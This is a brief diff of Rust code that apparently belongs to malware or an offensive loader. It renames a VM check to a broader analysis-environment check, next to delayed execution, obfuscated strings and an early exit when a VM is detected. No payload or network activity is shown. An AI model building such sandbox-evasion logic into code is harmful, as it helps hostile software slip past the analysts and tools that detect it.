@@ -84,7 +84,7 @@ fn run() -> Result<(), Box<dyn Error>> {
 
     delay_execution();
 
-    if ANALYSIS_DETECTION && vm_detected() {
+    if ANALYSIS_DETECTION && analysis_detected() {
         if VERBOSE {
             logger::log_info(obfstr!("VM detected. Exiting..."));
         }
